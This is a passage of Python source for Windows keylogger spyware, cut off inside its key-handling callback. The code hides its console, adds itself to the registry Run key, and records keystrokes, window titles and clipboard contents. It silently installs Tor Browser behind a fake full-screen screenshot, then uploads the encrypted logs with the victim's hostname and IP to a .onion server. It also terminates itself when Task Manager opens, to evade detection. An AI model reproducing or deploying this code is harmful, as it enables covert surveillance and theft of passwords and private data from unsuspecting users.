#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import ctypes
import hashlib
import multiprocessing
import os
import random
import signal
import socket
import stat
import sys
import threading
import time
import tkinter as tk
from datetime import datetime, timedelta, date
from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ

import Cryptodome.Util
import keyboard  # for keyboard hooks. See docs https://github.com/boppreh/keyboard
import numpy as np
import psutil
import pywinauto.timings
import requests
import socks
import win32api
import win32con
import win32console
import win32event
import win32gui
import win32ui
import winerror
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Hash import SHA3_512
from Cryptodome.PublicKey import RSA
from PIL import Image, ImageGrab, ImageTk
from keyboard import is_pressed
from pywinauto.application import Application
from win32clipboard import OpenClipboard, CloseClipboard, GetClipboardData


def hide():
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


if len(sys.argv) == 1:
    sys.argv = [sys.argv[0], 'local', 'encrypt']
# General precautions
elif len(sys.argv) > 10:                   # limit the number of args
    exit(0)
if any([len(k) > 260 for k in sys.argv]):  # limit the length of args
    exit(0)


# - GLOBAL SCOPE VARIABLES start -

mode = sys.argv[1]
if mode != "debug":
    hide()


# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    if mode == "debug":
        print("Multiple instances are not allowed")
    exit(0)


# CONSTANTS
PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
# Examples: 'C:\\...\\python.exe' or 'python' if it is on your PATH.
proxies = {'http': 'socks5h://127.0.0.1:9150',
           'https': 'socks5h://127.0.0.1:9150'}
url_server_upload = "https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/upload"
hidden_service_check_connection = "https://3g2upl4pq6kufc4m.onion/"  #"https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/check"


# Add to startup for persistence
def add_to_startup():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
                         key_val, 0, KEY_ALL_ACCESS)
    if executable:
        reg_value_prefix, reg_value_postfix = '', ''
    else:
        reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + PYTHON_EXEC_PATH + ' '
        reg_value_postfix = '"'
    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + mode + \
                (' encrypt' if encryption_on else '') + reg_value_postfix
    try:
        SetValueEx(key2change, "Start", 0, REG_SZ, reg_value)
    except Exception as e:
        print(e)


current_file_path = os.path.realpath(sys.argv[0])
dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
current_file_name = os.path.split(os.path.realpath(sys.argv[0]))[-1]

if current_file_name.split(".")[-1] == 'exe':
    executable = True
else:
    executable = False
if "encrypt" in sys.argv:
    encryption_on = True
add_to_startup()

# RSA PUBLIC KEY FOR ENCRYPTION
public_key_str = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArHvo2tItnqXC9sUEUknc
3u1gbjvkt5XbAfobxHeJTdmSBFK39J7yVEJx2pSU5SSxjVO8bABCKPRo6N+1Yq8c
2BMd9yss0vuMDUbZBf92J+hSfTJldf8EupN3UZ2ncfL4/OTVEN4AZM+5aSBsWH/1
TtGkXzHg+kpJicXen4deS1CebwAolvDm4pqzDPNa1mnrpQx1O5NQsJDu5vCcs5qk
ElqKsqezGQQsWVt7zTfcMwLTHZNEo+RABZFCs7aYIfS50q/LjchEyjohWCpw0mgn
zTrFFE0YAz+Q3B0mipKAerEx+YeBkWtNTNNdQ5SWPgBQmjpDXXKnn3LT0v/rR8jq
useA1z225e9OGCKqS6MwpC0edNRHgrrRVNhcMTSgvDAword1xDaYZepnx1PH4hv6
1fRZERPLa6Ks+ngWkc56FbDMSsPYWdZkR6SHli0EvmH0ZE9kMiegF1s/IFEfDdqJ
nmKiwe1aMHLjklu+gqGi9gaRhTjk9wkwvsj9WyX7PZo3/7BwpMhB44/TpE9dACIn
Bi2O0c8dqB+uHIRnElliNtj9VTc1jeEoRDS8+VEjJ3uSkpM/ETcPUnhfmUVxquBk
+9Iphypm0Wi5vtyH0gkZiA+VM3laPu7QfZ0LRkXHF+x5Et/S1zk8b3TF23MgkTIk
st12IlGUgWqrJBemqqvir4MCAwEAAQ==
-----END PUBLIC KEY-----"""
public_key = bytes(public_key_str, 'utf-8')
# with open("public_key.pem", "rb") as f:
#     public_key = f.read()

# this number of characters must be typed for the logger to write the line_buffer:
# (formula from Cryptodome.Cipher.PKCS1OAEP_Cipher.encypt)
CHAR_LIMIT = Cryptodome.Util.number.ceil_div(Cryptodome.Util.number.size(RSA.importKey(public_key).n), 8) - \
             2 * SHA3_512.digest_size - 2
MINUTES_TO_LOG_TIME = 5   # this number of minutes must pass for the current time to be logged.

# general check
encryption_on = True if 'encrypt' in sys.argv else False


def get_clipboard_value():
    clipboard_value = None
    try:
        OpenClipboard()
        clipboard_value = GetClipboardData()
    except:
        pass
    CloseClipboard()
    if clipboard_value:
        if 0 < len(clipboard_value) < 300:
            return clipboard_value


line_buffer, window_name = '', ''

clipboard_val = get_clipboard_value()
if clipboard_val:
    clipboard_logged = clipboard_val
else:
    clipboard_logged = ''

time_logged = datetime.now() - timedelta(minutes=MINUTES_TO_LOG_TIME)
count, backspace_buffer_len = 0, 0

# Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
             '0x401': 'Arabic - Saudi Arabia', '0x1401': 'Arabic - Algeria', '0x3c01': 'Arabic - Bahrain',
             '0x0c01': 'Arabic - Egypt', '0x801': 'Arabic - Iraq', '0x2c01': 'Arabic - Jordan',
             '0x3401': 'Arabic - Kuwait', '0x3001': 'Arabic - Lebanon', '0x1001': 'Arabic - Libya',
             '0x1801': 'Arabic - Morocco', '0x2001': 'Arabic - Oman', '0x4001': 'Arabic - Qatar',
             '0x2801': 'Arabic - Syria', '0x1c01': 'Arabic - Tunisia', '0x3801': 'Arabic - U.A.E.',
             '0x2401': 'Arabic - Yemen', '0x042b': 'Armenian - Armenia', '0x044d': 'Assamese',
             '0x082c': 'Azeri (Cyrillic)', '0x042c': 'Azeri (Latin)', '0x042d': 'Basque', '0x423': 'Belarusian',
             '0x445': 'Bengali (India)', '0x845': 'Bengali (Bangladesh)', '0x141A': 'Bosnian (Bosnia/Herzegovina)',
             '0x402': 'Bulgarian', '0x455': 'Burmese', '0x403': 'Catalan', '0x045c': 'Cherokee - United States',
             '0x804': "Chinese - People's Republic of China", '0x1004': 'Chinese - Singapore',
             '0x404': 'Chinese - Taiwan', '0x0c04': 'Chinese - Hong Kong SAR', '0x1404': 'Chinese - Macao SAR',
             '0x041a': 'Croatian', '0x101a': 'Croatian (Bosnia/Herzegovina)', '0x405': 'Czech', '0x406': 'Danish',
             '0x465': 'Divehi', '0x413': 'Dutch - Netherlands', '0x813': 'Dutch - Belgium', '0x466': 'Edo',
             '0x409': 'English - United States', '0x809': 'English - United Kingdom', '0x0c09': 'English - Australia',
             '0x2809': 'English - Belize', '0x1009': 'English - Canada', '0x2409': 'English - Caribbean',
             '0x3c09': 'English - Hong Kong SAR', '0x4009': 'English - India', '0x3809': 'English - Indonesia',
             '0x1809': 'English - Ireland', '0x2009': 'English - Jamaica', '0x4409': 'English - Malaysia',
             '0x1409': 'English - New Zealand', '0x3409': 'English - Philippines', '0x4809': 'English - Singapore',
             '0x1c09': 'English - South Africa', '0x2c09': 'English - Trinidad', '0x3009': 'English - Zimbabwe',
             '0x425': 'Estonian', '0x438': 'Faroese', '0x429': 'Farsi', '0x464': 'Filipino', '0x040b': 'Finnish',
             '0x040c': 'French - France', '0x080c': 'French - Belgium', '0x2c0c': 'French - Cameroon',
             '0x0c0c': 'French - Canada', '0x240c': 'French - Democratic Rep. of Congo', '0x300c':
                 "French - Cote d'Ivoire", '0x3c0c': 'French - Haiti', '0x140c': 'French - Luxembourg',
             '0x340c': 'French - Mali', '0x180c': 'French - Monaco', '0x380c': 'French - Morocco',
             '0xe40c': 'French - North Africa', '0x200c': 'French - Reunion', '0x280c': 'French - Senegal',
             '0x100c': 'French - Switzerland', '0x1c0c': 'French - West Indies', '0x462': 'Frisian - Netherlands',
             '0x467': 'Fulfulde - Nigeria', '0x042f': 'FYRO Macedonian', '0x083c': 'Gaelic (Ireland)',
             '0x043c': 'Gaelic (Scotland)', '0x456': 'Galician', '0x437': 'Georgian', '0x407': 'German - Germany',
             '0x0c07': 'German - Austria', '0x1407': 'German - Liechtenstein', '0x1007': 'German - Luxembourg',
             '0x807': 'German - Switzerland', '0x408': 'Greek', '0x474': 'Guarani - Paraguay', '0x447': 'Gujarati',
             '0x468': 'Hausa - Nigeria', '0x475': 'Hawaiian - United States', '0x040d': 'Hebrew', '0x439': 'Hindi',
             '0x040e': 'Hungarian', '0x469': 'Ibibio - Nigeria', '0x040f': 'Icelandic', '0x470': 'Igbo - Nigeria',
             '0x421': 'Indonesian', '0x045d': 'Inuktitut', '0x410': 'Italian - Italy',
             '0x810': 'Italian - Switzerland', '0x411': 'Japanese', '0x044b': 'Kannada', '0x471': 'Kanuri - Nigeria',
             '0x860': 'Kashmiri', '0x460': 'Kashmiri (Arabic)', '0x043f': 'Kazakh', '0x453': 'Khmer',
             '0x457': 'Konkani', '0x412': 'Korean', '0x440': 'Kyrgyz (Cyrillic)', '0x454': 'Lao', '0x476': 'Latin',
             '0x426': 'Latvian', '0x427': 'Lithuanian', '0x043e': 'Malay - Malaysia',
             '0x083e': 'Malay - Brunei Darussalam', '0x044c': 'Malayalam', '0x043a': 'Maltese', '0x458': 'Manipuri',
             '0x481': 'Maori - New Zealand', '0x044e': 'Marathi', '0x450': 'Mongolian (Cyrillic)',
             '0x850': 'Mongolian (Mongolian)', '0x461': 'Nepali', '0x861': 'Nepali - India',
             '0x414': 'Norwegian (Bokmål)', '0x814': 'Norwegian (Nynorsk)', '0x448': 'Oriya', '0x472': 'Oromo',
             '0x479': 'Papiamentu', '0x463': 'Pashto', '0x415': 'Polish', '0x416': 'Portuguese - Brazil',
             '0x816': 'Portuguese - Portugal', '0x446': 'Punjabi', '0x846': 'Punjabi (Pakistan)',
             '0x046B': 'Quecha - Bolivia', '0x086B': 'Quecha - Ecuador', '0x0C6B': 'Quecha - Peru',
             '0x417': 'Rhaeto-Romanic', '0x418': 'Romanian', '0x818': 'Romanian - Moldava', '0x419': 'Russian',
             '0x819': 'Russian - Moldava', '0x043b': 'Sami (Lappish)', '0x044f': 'Sanskrit', '0x046c': 'Sepedi',
             '0x0c1a': 'Serbian (Cyrillic)', '0x081a': 'Serbian (Latin)', '0x459': 'Sindhi - India',
             '0x859': 'Sindhi - Pakistan', '0x045b': 'Sinhalese - Sri Lanka', '0x041b': 'Slovak',
             '0x424': 'Slovenian', '0x477': 'Somali', '0x042e': 'Sorbian', '0x0c0a': 'Spanish - Spain (Modern Sort)',
             '0x040a': 'Spanish - Spain (Traditional Sort)', '0x2c0a': 'Spanish - Argentina',
             '0x400a': 'Spanish - Bolivia', '0x340a': 'Spanish - Chile', '0x240a': 'Spanish - Colombia',
             '0x140a': 'Spanish - Costa Rica', '0x1c0a': 'Spanish - Dominican Republic',
             '0x300a': 'Spanish - Ecuador', '0x440a': 'Spanish - El Salvador', '0x100a': 'Spanish - Guatemala',
             '0x480a': 'Spanish - Honduras', '0xe40a': 'Spanish - Latin America', '0x080a': 'Spanish - Mexico',
             '0x4c0a': 'Spanish - Nicaragua', '0x180a': 'Spanish - Panama', '0x3c0a': 'Spanish - Paraguay',
             '0x280a': 'Spanish - Peru', '0x500a': 'Spanish - Puerto Rico', '0x540a': 'Spanish - United States',
             '0x380a': 'Spanish - Uruguay', '0x200a': 'Spanish - Venezuela', '0x430': 'Sutu', '0x441': 'Swahili',
             '0x041d': 'Swedish', '0x081d': 'Swedish - Finland', '0x045a': 'Syriac', '0x428': 'Tajik',
             '0x045f': 'Tamazight (Arabic)', '0x085f': 'Tamazight (Latin)', '0x449': 'Tamil', '0x444': 'Tatar',
             '0x044a': 'Telugu', '0x041e': 'Thai', '0x851': 'Tibetan - Bhutan',
             '0x451': "Tibetan - People's Republic of China", '0x873': 'Tigrigna - Eritrea',
             '0x473': 'Tigrigna - Ethiopia', '0x431': 'Tsonga', '0x432': 'Tswana', '0x041f': 'Turkish',
             '0x442': 'Turkmen', '0x480': 'Uighur - China', '0x422': 'Ukrainian', '0x420': 'Urdu',
             '0x820': 'Urdu - India', '0x843': 'Uzbek (Cyrillic)', '0x443': 'Uzbek (Latin)', '0x433': 'Venda',
             '0x042a': 'Vietnamese', '0x452': 'Welsh', '0x434': 'Xhosa', '0x478': 'Yi', '0x043d': 'Yiddish',
             '0x046a': 'Yoruba', '0x435': 'Zulu', '0x04ff': 'HID (Human Interface Device)'}

latin_into_cyrillic = (u"`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                       u"qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                       u"~`{[}]:;\"'|<,>.?/@#$^&",
                       u"ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                       u"йцукенгшщзхъфывапролджэячсмитьбю." +
                       u"ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?")   # LATIN - CYRILLIC keyboard mapping
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])   # CYRILLIC - LATIN keyboard mapping

latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])

cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarusian', 'Kazakh',
                    'Kyrgyz (Cyrillic)', 'Mongolian (Cyrillic)', 'Tajik', 'Tatar', 'Serbian (Cyrillic)',
                    'Ukrainian', 'Uzbek (Cyrillic)']


def detect_key_layout():
    global lcid_dict
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    # made up of 0xAAABBBB, AAA = HKL (handle object) & BBBB = language ID
    # Language ID -> low 10 bits, Sub-language ID -> high 6 bits
    # Extract language ID from KLID
    lid = klid & (2 ** 16 - 1)
    # Convert language ID from decimal to hexadecimal
    lid_hex = hex(lid)
    try:
        language = lcid_dict[str(lid_hex)]
    except KeyError:
        language = lcid_dict['0x409']  # English - United States
    return language


def get_capslock_state():
    # using the answer here https://stackoverflow.com/a/21160382
    hll_dll = ctypes.WinDLL("User32.dll")
    vk = 0x14
    return True if hll_dll.GetKeyState(vk) == 1 else False


shift_on = False  # an assumption, GetKeyState doesn't work
capslock_on = get_capslock_state()


def update_upper_case():
    global capslock_on, shift_on
    if (capslock_on and not shift_on) or (not capslock_on and shift_on):
        res = True
    else:
        res = False
    return res


upper_case = update_upper_case()

# Determine the initial keyboard layout - to fix the keyboard module bug.

initial_language = detect_key_layout()


# - GLOBAL SCOPE VARIABLES end -


def encrypt(message_str):
    global public_key, CHAR_LIMIT
    # Import the Public Key and use for encryption using PKCS1_OAEP (RSAES-OAEP)
    key = RSA.importKey(public_key)
    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
    message = bytes(message_str, 'utf-8')
    # Use the public key for encryption
    if len(message) > CHAR_LIMIT:
        ciphertext, curr_position = b'', 0
        while curr_position < len(message):
            ciphertext += b'\n---START---' + \
                          base64.b64encode(cipher.encrypt(message[curr_position: curr_position + CHAR_LIMIT])) + \
                          b'---END---\n'
            curr_position += CHAR_LIMIT
    else:
        ciphertext = b'\n---START---' + base64.b64encode(cipher.encrypt(message)) + b'---END---\n'
    del key, cipher
    return ciphertext


def check_internet():
    protocols = ['https://', 'http://']
    sites_list = ['www.google.com', 'youtube.com', 'tmall.com', 'baidu.com', 'sohu.com', 'facebook.com',
                  'taobao.com', 'login.tmall.com', 'wikipedia.org', 'yahoo.com', '360.cn', 'amazon.com', 'jd.com',
                  'weibo.com', 'sina.com.cn', 'live.com', 'pages.tmall.com', 'reddit.com', 'vk.com', 'netflix.com',
                  'blogspot.com', 'alipay.com', 'csdn.net', 'bing.com', 'yahoo.co.jp', 'Okezone.com', 'instagram.com',
                  'google.com.hk', 'office.com']  # ~30 most popular websites in the world
    random_protocol = random.choice(protocols)
    try:
        r_status_code = requests.get(random_protocol + random.choice(sites_list)).status_code
        if r_status_code == 200:
            return True
        else:
            return False
    except:
        try:
            if random_protocol == 'https://':  # ensure switch to http (just in case)
                random_protocol = 'http://'
            r_status_code = requests.get(random_protocol + random.choice(sites_list)).status_code
            if r_status_code == 200:
                return True
            else:
                return False
        except:
            return False


def find_file(root_folder, dir_, file):
    for root, dirs, files in os.walk(root_folder):
        for f in files:
            file_search = (file == f)
            dir_search = (dir_ in root)
            if file_search and dir_search:
                return os.path.join(root, f)
    return


def find_file_in_all_drives(path):
    dir_ = os.path.split(path)[0]
    file = os.path.split(path)[-1]
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        result = find_file(drive, dir_, file)
        if result:
            return result


def check_if_tor_browser_is_installed():
    return find_file_in_all_drives('Tor Browser\\Browser\\firefox.exe')


def show_screenshot():
    tk.Tk().withdraw()
    root = tk.Toplevel()
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    root.overrideredirect(1)
    root.geometry("%dx%d+0+0" % (w, h))
    root.focus_set()
    root.bind("<Escape>", lambda e: (e.widget.withdraw(), e.widget.quit()))
    canvas = tk.Canvas(root, width=w, height=h)
    canvas.pack(in_=root)
    canvas.configure(background='black')
    screenshot = ImageGrab.grab()
    ph = ImageTk.PhotoImage(screenshot)
    canvas.create_image(w/2, h/2, image=ph)
    root.wm_attributes("-topmost", 1)
    root.mainloop()
    return


def count_image_diff(img1, img2):
    s = 0
    if img1.getbands() != img2.getbands():
        return -1
    for band_index, band in enumerate(img1.getbands()):
        m1 = np.array([p[band_index] for p in img1.getdata()]).reshape(*img1.size)
        m2 = np.array([p[band_index] for p in img2.getdata()]).reshape(*img2.size)
        s += np.sum(np.abs(m1 - m2))
    return s


def has_screen_changed(screenshot_1):
    screenshot_2 = ImageGrab.grab()
    diff = count_image_diff(screenshot_1, screenshot_2)
    if diff < 1000000:  # a change significant enough
        return False, screenshot_2
    else:
        return True, screenshot_2


def detect_user_inactivity():
    # Detect user inactivity by detecting screen change + mouse movement + key press
    seconds_inactive = 0
    screenshot_1 = ImageGrab.grab()
    mouse_saved_pos = win32api.GetCursorPos()
    keys_saved_pressed = keyboard.get_hotkey_name()
    sleep = 20  # seconds
    while seconds_inactive < sleep * 9:  # 3 minutes of mouse + keyboard + screen inactivity
        time.sleep(sleep)
        screen_changed, screenshot_1 = has_screen_changed(screenshot_1)
        mouse_pos, keys_pressed = win32api.GetCursorPos(), keyboard.get_hotkey_name()
        if screen_changed or mouse_saved_pos != mouse_pos or keys_saved_pressed != keys_pressed:
            mouse_saved_pos, keys_saved_pressed = mouse_pos, keys_pressed
            seconds_inactive = 0
        else:
            seconds_inactive += sleep
    return


def install_tor_browser():

    # 1. Download the installer
    try:
        r = requests.get("https://www.torproject.org/download/")
        if r.status_code == 200:
            tor_windows_url = "https://www.torproject.org" + r.text.split(".exe")[0].split("href=\"")[-1] + ".exe"
        else:
            tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
    except requests.exceptions.ConnectionError:
        tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
    try:
        tor_installer = requests.get(tor_windows_url)
    except requests.exceptions.ConnectionError:
        return
    installer_path = os.path.join(dir_path, tor_windows_url.split("/")[-1])

    # 1.1. Wait for user inactivity
    detect_user_inactivity()
    # 1.2. Write installer to the hard disk
    try: open(installer_path, 'wb').write(tor_installer.content)
    except: return

    # 2. Install

    screenshot_process = multiprocessing.Process(target=show_screenshot, args=())
    screenshot_process.start()

    time.sleep(15)

    # remove existing files
    installation_dir = os.path.join(dir_path, "Tor_Browser")
    if os.path.exists(installation_dir):
        try:
            os.remove(installation_dir)
        except:
            try:
                os.chmod(installation_dir, stat.S_IWRITE)
                os.remove(installation_dir)
            except:
                return

    try:
        app = Application(backend="win32").start(installer_path)
    except:
        screenshot_process.terminate()
        return
    try:
        app.Dialog.OK.wait('ready', timeout=30)
        app.Dialog.move_window(x=-2000, y=-2000)
        app.Dialog.OK.click()
        app.InstallDialog.Edit.wait('ready', timeout=30)
        app.Dialog.move_window(x=-2000, y=-2000)
        app.InstallDialog.Edit.set_edit_text(installation_dir)
        app.InstallDialog.InstallButton.wait('ready', timeout=30).click()
        try:
            app.InstallDialog.children()[0]
            if type(app.InstallDialog.children()[0]) == pywinauto.controls.win32_controls.ButtonWrapper:
                app.InstallDialog.children()[0].click()  # Overwrite - Yes
        except: pass
    except pywinauto.timings.TimeoutError:
        app.kill()
        screenshot_process.terminate()
        return
    try:
        app.InstallDialog.CheckBox.wait('ready', timeout=120).uncheck()
        app.InstallDialog.CheckBox2.wait('ready', timeout=120).uncheck()
        app.InstallDialog.FinishButton.wait('ready', timeout=30).click()
    except pywinauto.timings.TimeoutError:
        try:
            app.kill()
        except:
            pass
        screenshot_process.terminate()
        return

    screenshot_process.terminate()

    # 3. Remove the installer
    try:
        os.remove(installer_path)
    except:
        try:
            app.kill()
            os.chmod(installer_path, stat.S_IWRITE)
            os.remove(installer_path)
        except:
            pass

    return installation_dir


def is_program_already_open(program_path):
    for pid in psutil.pids():  # Iterates over all process-ID's found by psutil
        try:
            p = psutil.Process(pid)  # Requests the process information corresponding to each process-ID,
            # the output wil look (for example) like this: <psutil.Process(pid=5269, name='Python') at 4320652312>
            if program_path in p.exe():  # checks if the value of the program-variable
                # that was used to call the function matches the name field of the plutil.Process(pid)
                # output (see one line above).
                return pid, p.exe()
        except:
            continue
    return None, None


def find_top_windows(wanted_text=None, wanted_class=None, selection_function=None):
    """ Find the hwnd of top level windows.
    You can identify windows using captions, classes, a custom selection
    function, or any combination of these. (Multiple selection criteria are
    ANDed. If this isn't what's wanted, use a selection function.)

    Arguments:
    wanted_text          Text which required windows' captions must contain.
    wanted_class         Class to which required windows must belong.
    selection_function   Window selection function. Reference to a function
                        should be passed here. The function should take hwnd as
                        an argument, and should return True when passed the
                        hwnd of a desired window.

    Returns:            A list containing the window handles of all top level
                        windows matching the supplied selection criteria.

    Usage example:      optDialogs = find_top_windows(wanted_text="Options")
    """

    def _normalise_text(control_text):
        """Remove '&' characters, and lower case.
        Useful for matching control text """
        return control_text.lower().replace('&', '')

    def _windowEnumerationHandler(hwnd, resultList):
        '''Pass to win32gui.EnumWindows() to generate list of window handle,
        window text, window class tuples.'''
        resultList.append((hwnd,
                           win32gui.GetWindowText(hwnd),
                           win32gui.GetClassName(hwnd)))
    results = []
    top_windows = []
    win32gui.EnumWindows(_windowEnumerationHandler, top_windows)
    for hwnd, window_text, window_class in top_windows:
        if wanted_text and not _normalise_text(wanted_text) in _normalise_text(window_text):
            continue
        if wanted_class and not window_class == wanted_class:
            continue
        if selection_function and not selection_function(hwnd):
            continue
        results.append(hwnd)
    return results


def open_tor_browser(tor_installation_dir):
    user32 = ctypes.WinDLL('user32')
    os.startfile(os.path.join(tor_installation_dir, "Start Tor Browser.lnk"))
    start_time = time.time()
    check_1 = check_2 = False
    while time.time() - start_time < 5:
        hwnd_1 = find_top_windows(wanted_text="Establishing a Connection", wanted_class='MozillaDialogClass')
        hwnd_2 = find_top_windows(wanted_text="About Tor", wanted_class='MozillaWindowClass')
        if len(hwnd_1) == 1:
            user32.ShowWindow(hwnd_1[0], 0)
            check_1 = True
        if len(hwnd_2) == 1:
            user32.ShowWindow(hwnd_2[0], 0)
            check_2 = True
            break
    if not (check_1 and check_2):
        pid, _ = is_program_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
        if pid:
            os.kill(pid, 9)


def get_my_ip():
    server_parser_list = [(r'https://jsonip.com', "r.json()['ip']"),
                          (r'https://ifconfig.co/json', "r.json()['ip']"),
                          (r'https://ip.42.pl/raw', "r.text"),
                          (r'https://httpbin.org/ip', "r.json()['origin'].split(", ")[0]"),
                          (r'https://api.ipify.org/?format=json', "r.json()['ip']")]
    random.shuffle(server_parser_list)
    ip = ""
    counter = 0
    while counter < 5:
        try:
            r = requests.get(server_parser_list[counter][0])
            if r.status_code == 200:
                try:
                    ip = eval(server_parser_list[counter][1])
                    break
                except:
                    pass
        except requests.exceptions.ConnectionError:
            pass
        counter += 1
    return ip


def find_the_previous_log_and_send():
    if not check_internet():
        return
    # Find the old log
    found_filenames = []
    delta = 1
    while delta <= 366:
        previous_date = (date.today() - timedelta(days=delta)).strftime('%Y-%b-%d')
        previous_date_hashed = hashlib.md5(bytes(previous_date, 'utf-8')).hexdigest()
        if os.path.exists(previous_date_hashed + ".txt"):
            found_filenames.append(previous_date_hashed + ".txt")
        delta += 1
    # check if TOR is opened/installed
    open_tor_pid, tor_installation_dir = is_program_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
    if not tor_installation_dir:
        tor_installation_dir = check_if_tor_browser_is_installed()
    # if not tor_installation_dir:
    tor_installation_dir = install_tor_browser()                                     # TODO: add indent !!!
    if tor_installation_dir:
        tor_installation_dir = os.path.split(os.path.split(tor_installation_dir)[0])[0]  # cd .. & cd ..
    if not tor_installation_dir:
        return  # ONE DOES NOT SIMPLY USE CLEARNET.
    else:  # USE DARKNET ONLY
        if not open_tor_pid:
            open_tor_browser(tor_installation_dir)
        for found_filename in found_filenames:
            # Now that we found the old log files (found_filename), send them to our server.
            ip = get_my_ip()
            new_found_filename = str(socket.getfqdn()) + ("_" if ip != "" else "") + ip + "_" + found_filename
            os.rename(found_filename, new_found_filename)  # rename the file to avoid async errors (if second time)
            try:
                check_connection_status_code = requests.get(hidden_service_check_connection,
                                                            proxies=proxies).status_code
            except requests.exceptions.ConnectionError:
                os.rename(new_found_filename, found_filename)  # rename the file back
                return
            if check_connection_status_code == 200:  # send logs
                try:
                    uploaded_status = requests.post(url_server_upload,
                                                    proxies=proxies,
                                                    data=open(new_found_filename, "rb").read()).status_code
                except requests.exceptions.ConnectionError:
                    os.rename(new_found_filename, found_filename)  # rename the file back
                    return
                if uploaded_status == 200:
                    os.chmod(new_found_filename, stat.S_IWRITE)
                    os.remove(new_found_filename)
    return


def log_local():
    # Local mode
    global dir_path, line_buffer, backspace_buffer_len, window_name, time_logged
    todays_date = date.today().strftime('%Y-%b-%d')
    # md5 only for masking dates - it's easily crackable for us:
    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
    # We need to check if it is a new day, if so, send the old log to the server.
    if not os.path.exists(todays_date_hashed + ".txt"):  # a new day, a new life...
        # Evaluate find_the_previous_log_and_send asynchronously
        thr = threading.Thread(target=find_the_previous_log_and_send, args=(), kwargs={})
        thr.start()
    try:
        with open(os.path.join(dir_path, todays_date_hashed + ".txt"), "a") as fp:
            fp.write(line_buffer)
    except:
        if mode == "debug":
            print(e)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_debug():
    # Debug mode
    global line_buffer, backspace_buffer_len
    print(line_buffer)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_it():
    check_task_managers()
    global mode, line_buffer, encryption_on
    if encryption_on:
        line_buffer = encrypt(line_buffer).decode('utf-8')
    if mode == "local":
        log_local()
    elif mode == 'debug':
        log_debug()
    return True


def check_task_managers():
    if is_program_already_open(program_path='Taskmgr.exe')[0]:
        os.kill(os.getpid(), 9)
        exit()
    elif len(find_top_windows(wanted_text="task manager")) > 0:
        os.kill(os.getpid(), 9)
        exit()


def key_callback(event):
    keys_pressed = keyboard.get_hotkey_name()
    is_pressed_ctrl = is_pressed('ctrl')
    is_pressed_r_ctrl = is_pressed('right ctrl')
    is_pressed_shift = is_pressed('shift')
    is_pressed_r_shift = is_pressed('right shift')

    global line_buffer, window_name, time_logged, clipboard_logged, upper_case, capslock_on, shift_on, \
        backspace_buffer_len

    if event.event_type == 'up':
        if event.name in ['shift', 'right shift']:  # SHIFT UP
            shift_on = False
            upper_case = update_upper_case()
        return True

    window_buffer, time_buffer, clipboard_buffer = '', '', ''

    # 1. Detect the active window change - if so, LOG THE WINDOW NAME
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    event_window_name = win32gui.GetWindowText(curr_window)
    if window_name != event_window_name:
        window_buffer = '\n[WindowName: ' + event_window_name + ']: '
        window_name = event_window_name  # set the new value

    # 2. if MINUTES_TO_LOG_TIME minutes has passed - LOG THE TIME
    now = datetime.now()
    if now - time_logged > timedelta(minutes=MINUTES_TO_LOG_TIME):
        time_buffer = '\n[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '
        time_logged = now  # set the new value

    # 3. if clipboard changed, log it
    curr_clipboard = get_clipboard_value()
    if curr_clipboard:
        if curr_clipboard != clipboard_logged:
            clipboard_buffer = '\n[Clipboard: ' + curr_clipboard + ']: '
            clipboard_logged = curr_clipboard  # set the new value

    if time_buffer != "" or window_buffer != "" or clipboard_buffer != "":
        if line_buffer != "":
            log_it()  # log anything from old window / times / clipboard
        line_buffer = time_buffer + window_buffer + clipboard_buffer  # value to begin with
        """ backspace_buffer_len = the number of symbols of line_buffer up until the last technical tag (including it) 
         - window name, time or key tags (<BACKSPACE>, etc.).
